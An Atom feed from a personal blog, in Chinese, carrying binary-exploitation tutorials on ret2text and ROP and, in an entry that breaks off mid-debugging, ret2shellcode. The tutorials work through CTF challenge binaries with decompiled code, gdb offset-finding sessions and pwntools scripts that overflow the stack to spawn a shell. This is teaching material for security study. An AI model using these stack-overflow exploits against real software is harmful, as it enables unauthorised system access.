<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Rhea&#39;s Blog</title>
  
  
  <link href="https://rhea006.github.io/atom.xml" rel="self"/>
  
  <link href="https://rhea006.github.io/"/>
  <updated>2025-07-04T09:53:35.933Z</updated>
  <id>https://rhea006.github.io/</id>
  
  <author>
    <name>Rhea</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>1-ret2text</title>
    <link href="https://rhea006.github.io/2025/07/e6972740def5.html"/>
    <id>https://rhea006.github.io/2025/07/e6972740def5.html</id>
    <published>2025-07-03T09:00:00.000Z</published>
    <updated>2025-07-04T09:53:35.933Z</updated>
    
    <content type="html"><![CDATA[<p>随着 NX (Non-eXecutable) 保护的开启，传统的直接向栈或者堆上直接注入代码的方式难以继续发挥效果，由此攻击者们也提出来相应的方法来绕过保护。</p><p>目前被广泛使用的攻击手法是 <strong>返回导向编程</strong> (Return Oriented Programming)，其主要思想是在 <strong>栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。</strong></p><p>gadgets 通常是以 <code>ret</code> 结尾的指令序列，通过这样的指令序列，我们可以多次劫持程序控制流，从而运行特定的指令序列，以完成攻击的目的。</p><p>返回导向编程这一名称的由来是因为其核心在于利用了指令集中的 ret 指令，从而改变了指令流的执行顺序，并通过数条 gadget “执行” 了一个新的程序。</p><p>使用 ROP 攻击一般得满足如下条件：</p><ul><li>程序漏洞允许我们劫持控制流，并控制后续的返回地址。</li><li>可以找到满足条件的 gadgets 以及相应 gadgets 的地址。</li></ul><p>作为一项基本的攻击手段，ROP 攻击并不局限于栈溢出漏洞，也被广泛应用在堆溢出等各类漏洞的利用当中。</p><p>需要注意的是，现代操作系统通常会开启地址随机化保护（ASLR），这意味着 gadgets 在内存中的位置往往是不固定的。但幸运的是其相对于对应段基址的偏移通常是固定的，因此我们在寻找到了合适的 gadgets 之后可以通过其他方式泄漏程序运行环境信息，从而计算出 gadgets 在内存中的真正地址。</p><h1 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>ret2text 即控制程序执行程序本身已有的的代码 (即， <code>.text</code> 段中的代码) 。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 gadgets)，这就是我们所要说的 ROP。</p><p>这时，我们需要知道对应返回的代码的位置。当然程序也可能会开启某些保护，我们需要想办法去绕过这些保护。</p><h2 id="例1"><a href="#例1" class="headerlink" title="例1"></a>例1</h2><p>其实，在栈溢出的基本原理中，我们已经介绍了这一简单的攻击。在这里，我们再给出另外一个例子，bamboofox 中介绍 ROP 时使用的 ret2text 的例子。</p><blockquote><p>点击下载: <a href="../../../../../../../challeges/ret2text">ret2text</a></p></blockquote><p>首先，查看一下程序的保护机制：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  checksec ret2text</span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stripped:   No</span><br><span class="line">    Debuginfo:  Yes</span><br></pre></td></tr></table></figure><p>可以看出程序是 32 位程序，且仅开启了栈不可执行保护。接下来我们使用 IDA 反编译该程序：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char s[100]; // [esp+1Ch] [ebp-64h] BYREF</span><br><span class="line"></span><br><span class="line">  setvbuf(stdout, 0, 2, 0);</span><br><span class="line">  setvbuf(_bss_start, 0, 1, 0);</span><br><span class="line">  puts(&quot;There is something amazing here, do you know anything?&quot;);</span><br><span class="line">  gets(s);</span><br><span class="line">  printf(&quot;Maybe I will tell you next time !&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出程序在主函数中使用了 gets 函数，显然存在栈溢出漏洞。接下来查看反汇编代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:080485FD secure          proc near</span><br><span class="line">.text:080485FD</span><br><span class="line">.text:080485FD input           = dword ptr -10h</span><br><span class="line">.text:080485FD secretcode      = dword ptr -0Ch</span><br><span class="line">.text:080485FD</span><br><span class="line">.text:080485FD ; __unwind &#123;</span><br><span class="line">.text:080485FD                 push    ebp</span><br><span class="line">.text:080485FE                 mov     ebp, esp</span><br><span class="line">.text:08048600                 sub     esp, 28h</span><br><span class="line">.text:08048603                 mov     dword ptr [esp], 0 ; timer</span><br><span class="line">.text:0804860A                 call    _time</span><br><span class="line">.text:0804860F                 mov     [esp], eax      ; seed</span><br><span class="line">.text:08048612                 call    _srand</span><br><span class="line">.text:08048617                 call    _rand</span><br><span class="line">.text:0804861C                 mov     [ebp+secretcode], eax</span><br><span class="line">.text:0804861F                 lea     eax, [ebp+input]</span><br><span class="line">.text:08048622                 mov     [esp+4], eax</span><br><span class="line">.text:08048626                 mov     dword ptr [esp], offset unk_8048760</span><br><span class="line">.text:0804862D                 call    ___isoc99_scanf</span><br><span class="line">.text:08048632                 mov     eax, [ebp+input]</span><br><span class="line">.text:08048635                 cmp     eax, [ebp+secretcode]</span><br><span class="line">.text:08048638                 jnz     short locret_8048646</span><br><span class="line">.text:0804863A                 mov     dword ptr [esp], offset command ; &quot;/bin/sh&quot;</span><br><span class="line">.text:08048641                 call    _system</span><br></pre></td></tr></table></figure><p>在 secure 函数又发现了存在调用 <code>system(&quot;/bin/sh&quot;)</code> 的代码，那么如果我们直接控制程序返回至 <code>0x0804863A</code> ，那么就可以得到系统的 shell 了。</p><p>下面就是我们如何构造 payload 了，首先需要确定的是我们能够控制的内存的起始地址距离 main 函数的返回地址的字节数。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:080486A7                 lea     eax, [esp+1Ch]</span><br><span class="line">.text:080486AB                 mov     [esp], eax      ; s</span><br><span class="line">.text:080486AE                 call    _gets</span><br></pre></td></tr></table></figure><p>可以看到该字符串是通过相对于 esp 的索引，所以我们需要进行调试，将断点下在 call 处，查看 esp，ebp，如下：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gef➤  b *0x080486AE</span><br><span class="line">Breakpoint 1 at 0x80486ae: file ret2text.c, line 24.</span><br><span class="line">gef➤  r</span><br><span class="line">There is something amazing here, <span class="keyword">do</span> you know anything?</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x080486ae <span class="keyword">in</span> main () at ret2text.c:24</span><br><span class="line">warning: 24ret2text.c: No such file or directory</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA</span><br><span class="line">─────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────</span><br><span class="line"> EAX  0xffb62afc ◂— 0</span><br><span class="line"> EBX  0xf52dae34 (_GLOBAL_OFFSET_TABLE_) ◂— 0x230d2c /* <span class="string">&#x27;,\r#&#x27;</span> */</span><br><span class="line"> ECX  0xf52dc8a0 (_IO_stdfile_1_lock) ◂— 0</span><br><span class="line"> EDX  0</span><br><span class="line"> EDI  0xf532cb60 (_rtld_global_ro) ◂— 0</span><br><span class="line"> ESI  0x80486d0 (__libc_csu_init) ◂— push ebp</span><br><span class="line"> EBP  0xffb62b68 ◂— 0</span><br><span class="line"> ESP  0xffb62ae0 —▸ 0xffb62afc ◂— 0</span><br><span class="line"> EIP  0x80486ae (main+102) ◂— call gets@plt</span><br></pre></td></tr></table></figure><p>可以看到 esp 为 0xffb62ae0，ebp 为 0xffb62b68，同时 s 相对于 esp 的索引为 <code>esp+0x1c</code>，因此，我们可以推断：</p><ul><li>s 的地址为 0xffb62afc</li><li>s 相对于 ebp 的偏移为 0x6c</li><li>s 相对于返回地址的偏移为 0x6c+4</li></ul><p>或者</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; b *0x080486AE</span><br><span class="line">Breakpoint 1 at 0x80486ae: file ret2text.c, line 24.</span><br><span class="line">pwndbg&gt; r</span><br><span class="line">pwndbg&gt; cyclic 512</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaaf</span><br><span class="line">pwndbg&gt; ni</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaaf</span><br><span class="line">pwndbg&gt; ni</span><br><span class="line">pwndbg&gt; 回车</span><br><span class="line">pwndbg&gt; </span><br><span class="line">00:0000│ esp 0xffa5f5cc ◂— 0x62616164 (<span class="string">&#x27;daab&#x27;</span>)</span><br><span class="line">01:0004│     0xffa5f5d0 ◂— 0x62616165 (<span class="string">&#x27;eaab&#x27;</span>)</span><br><span class="line">02:0008│     0xffa5f5d4 ◂— 0x62616166 (<span class="string">&#x27;faab&#x27;</span>)</span><br><span class="line">03:000c│     0xffa5f5d8 ◂— 0x62616167 (<span class="string">&#x27;gaab&#x27;</span>)</span><br><span class="line">04:0010│     0xffa5f5dc ◂— 0x62616168 (<span class="string">&#x27;haab&#x27;</span>)</span><br><span class="line">05:0014│     0xffa5f5e0 ◂— 0x62616169 (<span class="string">&#x27;iaab&#x27;</span>)</span><br><span class="line">06:0018│     0xffa5f5e4 ◂— 0x6261616a (<span class="string">&#x27;jaab&#x27;</span>)</span><br><span class="line">07:001c│     0xffa5f5e8 ◂— 0x6261616b (<span class="string">&#x27;kaab&#x27;</span>)</span><br><span class="line">pwndbg&gt; cyclic -l daab</span><br><span class="line">Finding cyclic pattern of 4 bytes: b<span class="string">&#x27;daab&#x27;</span> (hex: 0x64616162)</span><br><span class="line">Found at offset 112</span><br></pre></td></tr></table></figure><p>因此最后的 payload 如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&#x27;./ret2text&#x27;</span>)</span><br><span class="line">target = <span class="number">0x804863a</span></span><br><span class="line">sh.sendline(<span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x6c</span> + <span class="number">4</span>) + p32(target))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="例2"><a href="#例2" class="headerlink" title="例2"></a>例2</h2><p>点击下载: <a href="../../../../../../../challeges/ez_pwn">ez_pwn</a></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  checksec ret2text</span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        No PIE (0x400000)</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br></pre></td></tr></table></figure><p>可以看出程序是64位小端程序，且仅开启了栈不可执行保护。接下来我们使用 IDA 反编译该程序：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+Ch] [rbp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Guess what I think!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;233 or 666&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">  <span class="keyword">if</span> ( v4 == <span class="number">233</span> )</span><br><span class="line">    sub_400726();</span><br><span class="line">  <span class="keyword">if</span> ( v4 == <span class="number">666</span> )</span><br><span class="line">    sub_400737();</span><br><span class="line">  <span class="keyword">if</span> ( v4 == <span class="number">5438</span> )</span><br><span class="line">    sub_400748(<span class="number">5438</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现输入5438后会进入 sub_400748</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_400748</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">32</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You find my secret!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;So,Tell me your name!&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x50u</span>LL);</span><br><span class="line">  result = <span class="built_in">printf</span>(<span class="string">&quot;I have remembered you, %s&quot;</span>, buf);</span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">233</span> )</span><br><span class="line">    <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>存在栈溢出漏洞，且有 system(“&#x2F;bin&#x2F;sh”)[a1&#x3D;0xe9即可得到],buf 距离 rbp 存在有0x20个字符</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000400748 sub_400748      proc near               ; CODE XREF: main+91↓p</span><br><span class="line">.text:0000000000400748</span><br><span class="line">.text:0000000000400748 var_24          = dword ptr -24h</span><br><span class="line">.text:0000000000400748 buf             = byte ptr -20h</span><br><span class="line">.text:0000000000400748</span><br><span class="line">.text:0000000000400748 ; __unwind &#123;</span><br><span class="line">.text:0000000000400748                 push    rbp</span><br><span class="line">.text:0000000000400749                 mov     rbp, rsp</span><br><span class="line">.text:000000000040074C                 sub     rsp, 30h</span><br><span class="line">.text:0000000000400750                 mov     [rbp+var_24], edi</span><br><span class="line">.text:0000000000400753                 mov     edi, offset aYouFindMySecre ; &quot;You find my secret!&quot;</span><br><span class="line">.text:0000000000400758                 call    _puts</span><br><span class="line">.text:000000000040075D                 mov     edi, offset aSoTellMeYourNa ; &quot;So,Tell me your name!&quot;</span><br><span class="line">.text:0000000000400762                 call    _puts</span><br><span class="line">.text:0000000000400767                 lea     rax, [rbp+buf]</span><br><span class="line">.text:000000000040076B                 mov     edx, 50h ; &#x27;P&#x27;  ; nbytes</span><br><span class="line">.text:0000000000400770                 mov     rsi, rax        ; buf</span><br><span class="line">.text:0000000000400773                 mov     edi, 0          ; fd</span><br><span class="line">.text:0000000000400778                 mov     eax, 0</span><br><span class="line">.text:000000000040077D                 call    _read</span><br><span class="line">.text:0000000000400782                 lea     rax, [rbp+buf]</span><br><span class="line">.text:0000000000400786                 mov     rsi, rax</span><br><span class="line">.text:0000000000400789                 mov     edi, offset format ; &quot;I have remembered you, %s&quot;</span><br><span class="line">.text:000000000040078E                 mov     eax, 0</span><br><span class="line">.text:0000000000400793                 call    _printf</span><br><span class="line">.text:0000000000400798                 cmp     [rbp+var_24], 0E9h</span><br><span class="line">.text:000000000040079F                 jnz     short loc_4007AB</span><br><span class="line">.text:00000000004007A1                 mov     edi, offset command ; &quot;/bin/sh&quot;</span><br><span class="line">.text:00000000004007A6                 call    _system</span><br><span class="line">.text:00000000004007AB</span><br><span class="line">.text:00000000004007AB loc_4007AB:                             ; CODE XREF: sub_400748+57↑j</span><br><span class="line">.text:00000000004007AB                 nop</span><br><span class="line">.text:00000000004007AC                 leave</span><br><span class="line">.text:00000000004007AD                 retn</span><br></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">+-----------------+</span><br><span class="line">| ...             | </span><br><span class="line">+-----------------+</span><br><span class="line">| buf[31]         |  &lt;-- rbp-0x20 + 31</span><br><span class="line">| ...             |</span><br><span class="line">| buf[0]          |  &lt;-- rbp-0x20 (buf起始位置)</span><br><span class="line">+-----------------+</span><br><span class="line">| 保存的RBP       |  &lt;-- rbp (当前栈帧基址)</span><br><span class="line">+-----------------+</span><br><span class="line">| 返回地址        |  &lt;-- rbp+0x8</span><br><span class="line">+-----------------+</span><br><span class="line">| ...             |</span><br><span class="line">+-----------------+</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">sh = process(<span class="string">&#x27;./ez_pwn&#x27;</span>)</span><br><span class="line">binsh_addr=<span class="number">0x4007a1</span></span><br><span class="line">sh.sendline(<span class="string">b&#x27;5438&#x27;</span>)</span><br><span class="line">buf_padding = <span class="string">b&#x27;A&#x27;</span> * <span class="number">31</span> + <span class="string">b&#x27;\x00&#x27;</span>  <span class="comment"># 填充buf (32字节), 末尾\x00防止printf乱码</span></span><br><span class="line">rbp_value = p64(<span class="number">0x601040</span>)   <span class="comment">#典型的.bss段起始地址（可通过readelf -S ./binary确认）</span></span><br><span class="line">return_addr = p64(binsh_addr)      <span class="comment"># 覆盖返回地址为system调用处</span></span><br><span class="line">payload = buf_padding + rbp_value + return_addr</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./ez_pwn&#x27;</span>)  </span><br><span class="line">system_addr = <span class="number">0x4007A1</span>  <span class="comment"># system(&quot;/bin/sh&quot;)地址</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;5438&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x20</span>      <span class="comment"># 填充buf (32字节)</span></span><br><span class="line">payload += p64(<span class="number">1</span>)        <span class="comment"># 覆盖RBP (任意值)</span></span><br><span class="line">payload += p64(system_addr) <span class="comment"># 覆盖返回地址</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>64 位程序，需要处理堆栈平衡<br><code>堆栈平衡：当我们在堆栈中进行堆栈的操作的时候，一定要保证在ret这条指令之前，esp指向的是我们压入栈中的地址，函数执行到ret执行之前，堆栈栈顶的地址一定要是call指令的下一个地址。</code></p><p>64 位程序的ROP链</p><p>程序执行完 <code>pop rdi; ret</code> 后：</p><ul><li><p><code>pop rdi</code> 把 <code>&quot;/bin/sh&quot;</code> 地址拿给 <code>rdi</code>。</p></li><li><p><code>ret</code> 自动去栈顶取下一条指令地址，正好就是 <code>system()</code>。</p></li><li><p><code>system()</code> 一看 <code>rdi</code> 里是 <code>&quot;/bin/sh&quot;</code>，就执行它，shell 就出来</p></li></ul><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">|-----------------------| &lt;-- 栈底 (高地址)</span><br><span class="line">| ....(程序原有数据) .....|</span><br><span class="line">|-----------------------|</span><br><span class="line">| 返回地址 (被覆盖)        | --&gt; 指向 pop rdi; ret (0x4011d2) &lt;-- 你覆盖的</span><br><span class="line">|-----------------------|</span><br><span class="line">| 参数1 (给 pop rdi)     | --&gt; &quot;/bin/sh&quot; 地址 (0x601000)    &lt;-- 你放的</span><br><span class="line">|-----------------------|</span><br><span class="line">| 返回地址 (给 pop rdi 之后的 ret) | --&gt; 指向 system() (0x400530) &lt;-- 你放的</span><br><span class="line">|-----------------------|</span><br><span class="line">| ... (可能还有更多) .... |</span><br><span class="line">|-----------------------|</span><br><span class="line">| b&#x27;A&#x27; * 32             | &lt;-- 填充的垃圾数据               &lt;-- 你放的</span><br><span class="line">|-----------------------| &lt;-- 栈顶 (低地址) - 你的输入从这里开始</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;随着 NX (Non-eXecutable) 保护的开启，传统的直接向栈或者堆上直接注入代码的方式难以继续发挥效果，由此攻击者们也提出来相应的方法来绕过保护。&lt;/p&gt;
&lt;p&gt;目前被广泛使用的攻击手法是 &lt;strong&gt;返回导向编程&lt;/strong&gt; (Return Orie</summary>
      
    
    
    
    <category term="PWN" scheme="https://rhea006.github.io/categories/PWN/"/>
    
    <category term="Learning" scheme="https://rhea006.github.io/categories/PWN/Learning/"/>
    
    <category term="5-栈溢出与ROP" scheme="https://rhea006.github.io/categories/PWN/Learning/5-%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B8%8EROP/"/>
    
    <category term="Stack Overflow" scheme="https://rhea006.github.io/categories/PWN/Learning/5-%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B8%8EROP/Stack-Overflow/"/>
    
    <category term="x86x64" scheme="https://rhea006.github.io/categories/PWN/Learning/5-%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B8%8EROP/Stack-Overflow/x86x64/"/>
    
    <category term="3-基本ROP" scheme="https://rhea006.github.io/categories/PWN/Learning/5-%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B8%8EROP/Stack-Overflow/x86x64/3-%E5%9F%BA%E6%9C%ACROP/"/>
    
    
  </entry>
  
  <entry>
    <title>ret2shellcode</title>
    <link href="https://rhea006.github.io/2025/07/d2926fd10b92.html"/>
    <id>https://rhea006.github.io/2025/07/d2926fd10b92.html</id>
    <published>2025-07-03T09:00:00.000Z</published>
    <updated>2025-07-04T09:53:35.933Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>ret2shellcode，即控制程序执行 shellcode 代码。shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。<strong>通常情况下，shellcode 需要我们自行编写，即此时我们需要自行向内存中填充一些可执行的代码</strong>。</p><p>在栈溢出的基础上，要想执行 shellcode，需要对应的 binary 在运行时，shellcode 所在的区域具有可执行权限。</p><p>需要注意的是，<strong>在新版内核当中引入了较为激进的保护策略，程序中通常不再默认有同时具有可写与可执行的段，这使得传统的 ret2shellcode 手法不再能直接完成利用</strong>。</p><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p>这里我们以 bamboofox 中的 ret2shellcode 为例，需要注意的是，你应当在内核版本较老的环境中进行实验（如 Ubuntu 18.04 或更老版本）。由于容器环境间共享同一内核，因此这里我们无法通过 docker 完成环境搭建。</p><blockquote><p>点击下载: <a href="../../../../../../../challeges/ret2shellcode">ret2shellcode</a></p></blockquote><p>首先检测程序开启的保护：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  checksec ret2shellcode</span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    Stripped:   No</span><br><span class="line">    Debuginfo:  Yes</span><br></pre></td></tr></table></figure><p>可以看出源程序几乎没有开启任何保护，并且有可读，可写，可执行段。接下来我们再使用 IDA 对程序进行反编译：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">100</span>]; <span class="comment">// [esp+1Ch] [ebp-64h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;No system for you this time !!!&quot;</span>);</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="built_in">strncpy</span>(buf2, s, <span class="number">0x64u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;bye bye ~&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出，程序仍然是基本的栈溢出漏洞，不过这次还同时将对应的字符串复制到 buf2 处。简单查看可知 buf2 在 bss 段。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.bss:0804A080                 public buf2</span><br><span class="line">.bss:0804A080 ; char buf2[100]</span><br></pre></td></tr></table></figure><p>这时，我们简单的调试下程序，看看这一个 bss 段是否可执行。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gef➤  b main</span><br><span class="line">Breakpoint 1 at 0x8048536: file ret2shellcode.c, line 8.</span><br><span class="line">gef➤  r</span><br><span class="line">Starting program: /CTF/ret2shellcode</span><br><span class="line">warning: Error disabling address space randomization: Operation not permitted</span><br><span class="line">[Thread debugging using libthread_db enabled]</span><br><span class="line">Using host libthread_db library <span class="string">&quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;</span>.</span><br><span class="line"></span><br><span class="line">Breakpoint 1, main () at ret2shellcode.c:8</span><br><span class="line">warning: 8ret2shellcode.c: No such file or directory</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA</span><br><span class="line">─────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────</span><br><span class="line"> EAX  0x804852d (main) ◂— push ebp</span><br><span class="line"> EBX  0xf7faae34 (_GLOBAL_OFFSET_TABLE_) ◂— 0x230d2c /* <span class="string">&#x27;,\r#&#x27;</span> */</span><br><span class="line"> ECX  0x32076bc2</span><br><span class="line"> EDX  0xffffd530 —▸ 0xf7faae34 (_GLOBAL_OFFSET_TABLE_) ◂— 0x230d2c /* <span class="string">&#x27;,\r#&#x27;</span> */</span><br><span class="line"> EDI  0xf7ffcb60 (_rtld_global_ro) ◂— 0</span><br><span class="line"> ESI  0x80485d0 (__libc_csu_init) ◂— push ebp</span><br><span class="line"> EBP  0xffffd508 ◂— 0</span><br><span class="line"> ESP  0xffffd480 —▸ 0xf7ffdb8c —▸ 0xf7fc16f0 —▸ 0xf7ffda20 ◂— 0</span><br><span class="line"> EIP  0x8048536 (main+9) ◂— mov eax, dword ptr [0x804a060]</span><br><span class="line">───────────────────────[ DISASM / i386 / <span class="built_in">set</span> <span class="built_in">emulate</span> on ]───────────────────────</span><br><span class="line"> ► 0x8048536 &lt;main+9&gt;     mov    eax, dword ptr [stdout@@GLIBC_2.0]     EAX, [stdout@@GLIBC_2.0] =&gt; 0xf7fabd40 (_IO_2_1_stdout_) ◂— 0xfbad2084</span><br><span class="line">   0x804853b &lt;main+14&gt;    mov    dword ptr [esp + 0xc], 0               [0xffffd48c] &lt;= 0</span><br><span class="line">   0x8048543 &lt;main+22&gt;    mov    dword ptr [esp + 8], 2                 [0xffffd488] &lt;= 2</span><br><span class="line">   0x804854b &lt;main+30&gt;    mov    dword ptr [esp + 4], 0                 [0xffffd484] &lt;= 0</span><br><span class="line">   0x8048553 &lt;main+38&gt;    mov    dword ptr [esp], eax                   [0xffffd480] &lt;= 0xf7fabd40 (_IO_2_1_stdout_) ◂— 0xfbad2084</span><br><span class="line">   0x8048556 &lt;main+41&gt;    call   setvbuf@plt                 &lt;setvbuf@plt&gt;</span><br><span class="line"></span><br><span class="line">   0x804855b &lt;main+46&gt;    mov    eax, dword ptr [stdin@@GLIBC_2.0]      EAX, [stdin@@GLIBC_2.0]</span><br><span class="line">   0x8048560 &lt;main+51&gt;    mov    dword ptr [esp + 0xc], 0</span><br><span class="line">   0x8048568 &lt;main+59&gt;    mov    dword ptr [esp + 8], 1</span><br><span class="line">   0x8048570 &lt;main+67&gt;    mov    dword ptr [esp + 4], 0</span><br><span class="line">   